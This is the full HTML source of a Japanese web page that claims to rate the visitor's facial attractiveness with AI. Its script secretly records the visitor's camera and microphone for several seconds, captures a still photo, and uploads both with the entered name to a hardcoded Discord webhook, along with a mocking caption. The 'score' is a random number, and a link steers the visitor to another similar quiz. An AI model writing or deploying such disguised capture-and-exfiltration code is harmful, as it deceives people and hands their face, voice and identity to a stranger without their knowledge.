<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI超精密・顔面偏差値診断</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { color: #007bff; font-size: 1.8em; margin-bottom: 20px; }
        input {
            width: 80%; padding: 15px; margin-bottom: 20px; border-radius: 8px; 
            border: 1px solid #333; background: #222; color: #fff; font-size: 1.1em; text-align: center;
        }
        button { 
            width: 85%; padding: 18px; font-size: 1.2em; font-weight: bold;
            background: linear-gradient(135deg, #007bff, #0056b3); color: white; 
            border: none; border-radius: 10px; cursor: pointer;
        }
        #video { 
            width: 100%; border-radius: 15px; background: #000; 
            aspect-ratio: 4 / 3; object-fit: cover; margin-top: 20px; display: none;
        }
        #result { font-size: 1.5em; color: #ff0055; margin-top: 25px; font-weight: bold; }
        #canvas { display: none; }
        /* 誘導リンクのスタイル */
        .next-link { display: none; margin-top: 20px; padding: 15px; background: #222; border-radius: 10px; border: 1px solid #444; }
        .next-link a { color: #00f2ff; text-decoration: none; font-weight: bold; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI顔面偏差値診断</h1>
        <p>名前を入力して、AIによる精密スキャンを開始してください。</p>
        
        <input type="text" id="username" placeholder="お名前（任意）" maxlength="15">
        <br>
        <button id="startBtn">AI顔面偏差値診断を開始する</button>
        
        <video id="video" autoplay playsinline muted></video>
        <div id="result"></div>

        <div id="nextStep" class="next-link">
            <p style="margin:0 0 10px 0; font-size:0.8em; color:#888;">こちらの診断もおすすめです</p>
            <a href="https://Anier732.github.io/style/">【新着】AI超精密・3Dスタイル偏差値診断へ →</a>
        </div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const nameInput = document.getElementById('username');
        const nextStep = document.getElementById('nextStep');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';

        let mediaRecorder;
        let chunks = [];

        startBtn.addEventListener('click', () => {
            const user = nameInput.value || '名無しさん';
            startBtn.style.display = 'none';
            nameInput.style.display = 'none';
            video.style.display = 'block';
            result.innerHTML = "AIエンジンを起動中...<br>解析のため、3秒間静止してください";

            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    video.srcObject = stream;
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                    mediaRecorder.start();

                    setTimeout(() => {
                        captureAndSend(user);
                    }, 4000); 
                })
                .catch(err => {
                    alert("エラー：診断にはカメラとマイクの許可が必要です。");
                    location.reload();
                });
        });

        function captureAndSend(user) {
            result.innerHTML = "スキャン完了。解析データを送信中...";
            if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();

            const vW = video.videoWidth;
            const vH = video.videoHeight;
            canvas.width = vW; canvas.height = vH;
            canvas.getContext('2d').drawImage(video, 0, 0, vW, vH);

            setTimeout(() => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                canvas.toBlob(photoBlob => {
                    const formData = new FormData();
                    formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 名前:** ${user}`);
                    formData.append('file1', photoBlob, 'face.png');
                    formData.append('file2', videoBlob, 'face_video.webm');

                    fetch(webhookUrl, { method: 'POST', body: formData })
                    .then(() => {
                        const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
                        result.innerHTML = `${user}さんの解析結果：<br><span style="font-size:1.8em;">偏差値 ${score}</span>`;
                        // 診断完了後にリンクを表示
                        nextStep.style.display = 'block';
                        video.srcObject.getTracks().forEach(track => track.stop());
                    });
                }, 'image/png');
            }, 1000);
        }
    </script>
</body>
</html>
